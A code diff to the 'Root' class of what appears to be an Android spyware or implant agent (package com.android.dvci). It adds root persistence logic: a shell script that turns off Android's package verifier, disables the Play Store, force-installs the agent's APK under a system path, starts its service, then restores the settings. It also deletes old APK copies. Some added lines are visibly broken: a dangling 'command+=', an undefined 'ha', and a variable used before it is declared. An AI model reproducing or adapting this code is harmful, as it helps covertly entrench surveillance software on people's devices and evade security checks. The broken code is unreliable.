@@ -7,6 +7,7 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.crypto.Keys;
+import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.util.ByteArray;
@@ -17,11 +18,19 @@ import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.BufferedInputStream;
+import java.io.BufferedOutputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.ObjectInput;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.OutputStream;
+import java.io.Serializable;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
@@ -43,7 +52,9 @@ public class Root {
 	private static int askedSu = 0;
 	private static boolean oom_adjusted;
 	private final static String SU = M.e("su");
+	private Markup markupOldApk;
 	static Semaphore semGetPermission = new Semaphore(1);
+	private static final String DEL_OLD_APK_MARKUP = ".ap";
 
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
@@ -215,6 +226,62 @@ public class Root {
 			Check.log(TAG + " (adjustOom): OOM Adjusted"); //$NON-NLS-1$
 		}
 	}
+	public static Boolean saveStringToSerFile(AutoFile f,String s){
+		try {
+			OutputStream file = new FileOutputStream(f.getFile());
+			OutputStream buffer = new BufferedOutputStream(file);
+			ObjectOutputStream oos = new ObjectOutputStream(buffer);
+			oos.writeObject(s);
+			oos.close();
+			return true;
+		}catch(Exception e){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(saveStringToSerFile)" + e);
+			}
+		}
+		return false;
+	}
+
+	public static String getStringFromSerFile(AutoFile f){
+		String res=null;
+		try{
+			InputStream file = new FileInputStream(f.getFile());
+			InputStream buffer = new BufferedInputStream(file);
+			ObjectInput input = new ObjectInputStream(buffer);
+			//deserialize the List
+			res = (String)input.readObject();
+		}
+		catch(ClassNotFoundException ex){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(getStringFromObj) Cannot perform input. Class not found." + ex);
+			}
+		}
+		catch(IOException ex){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(getStringFromObj) Cannot perform input." + ex);
+			}
+		}
+		return res;
+	}
+
+	private static void createdelOldApkMarkup(String s) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createdelOldApkMarkup) ");
+		}
+		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), DEL_OLD_APK_MARKUP);
+		saveStringToSerFile(markup,s);
+	}
+
+	private String haveOldApkMarkup() {
+		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), DEL_OLD_APK_MARKUP);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (OldApkMarkup) "+ markup.exists());
+		}
+		if(markup.exists()) {
+			return getStringFromSerFile(markup);
+		}
+		return null;
+	}
 
 	static public boolean uninstallRoot() {
 		if (Status.haveRoot() == false) {
@@ -289,6 +356,8 @@ public class Root {
 		}
 		return false;
 	}
+
+
 	static boolean installPersistence(Boolean forceInstall) {
 		android.content.pm.PackageInfo pi = null;
 		String apkPosition = null;
@@ -299,32 +368,42 @@ public class Root {
 			}
 			isPersisten = Status.isPersistent();
 		}
-		if( isPersisten ){
+		if( isPersisten || Status.persistencyReady()){
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (installPersistence): already persistent!! " );
+			}
+			String s=null;
+			if(isPersisten && (s=ha)!=null){
+				ExecuteResult pers = Execute.executeRoot(String.format(M.e("rm /%s*"),s) + "\n");
+				Status.setApkName(perPkg);
 				return true;
 			}
+			command+=
+
+			return true;
 		}
-		/*
-		AutoFile apkFile = new AutoFile(M.e("/system/app/StkDevice.apk"));
-		if (apkFile.exists()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (installPersistence) apk already there and persistent: " + apkFile);
-				return true;
-			}
-		}
-		*/
+
 
 		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
+		createdelOldApkMarkup(String.format(M.e("rm /%s*"), apkPosition.split("-")[0]));
 
-
-		String perPkg = M.e("/system/app/StkDevice.apk");
-		String command = M.e("[ -s ") + perPkg + M.e(" ] && exit") + "\n";
-		command+= Configuration.shellFileBase + M.e(" blw") + "\n";
+		String perPkg = Status.persistencyApk;
+		String command = M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib")+ "\n";
+		command+= M.e("settings put global package_verifier_enable 0") + "\n";
+		command+= M.e("pm disable com.android.vending") + "\n";
+		command+= M.e("sleep 1") + "\n";
 		command+= String.format(M.e("cat %s > ") + perPkg, apkPosition) + "\n";
 		command+= M.e("chmod 644 ") + perPkg + "\n";
-		command+= String.format(M.e("[ -s ") + perPkg + M.e(" ] && rm /%s"), apkPosition) + "\n";
-
+		command+= String.format(M.e("[ -s %s ] && pm install -r -f "), perPkg) + perPkg + "\n";
+		command+= M.e("sleep 1") + "\n";
+		command+= M.e("installed=$(pm list packages com.android.dvci)") + "\n";
+		command+= M.e("if [ ${#installed} -gt 0 ]; then") + "\n";
+		command+= M.e("am startservice com.android.dvci/.ServiceMain") + "\n";
+		command+= M.e("am broadcast -a android.intent.action.USER_PRESENT") + "\n";
+		command+= M.e("fi") + "\n";
+		command+= M.e("sleep 2") + "\n";
+		command+= M.e("settings put global package_verifier_enable 1") + "\n";
+		command+= M.e("pm enable com.android.vending") + "\n";
 		command+= Configuration.shellFileBase + M.e(" blr") + "\n";
 		ExecuteResult ret = Execute.executeScript(command);
 
@@ -335,11 +414,7 @@ public class Root {
 			Check.log(TAG + " (installPersistence) ls: " + pers.getStdout());
 		}
 
-		if(persString.contains(M.e("StkDevice.apk"))){
-			command = M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm -r -f install ") + perPkg + "\n";
-			command+= M.e("am startservice com.android.dvci/.ServiceMain") + "\n";
-			command+= M.e("am broadcast -a android.intent.action.USER_PRESENT") + "\n";
-			Execute.executeScript(command);
+		if(persString.contains(perPkg)){
 			Status.setApkName(perPkg);
 			return true;
 		}
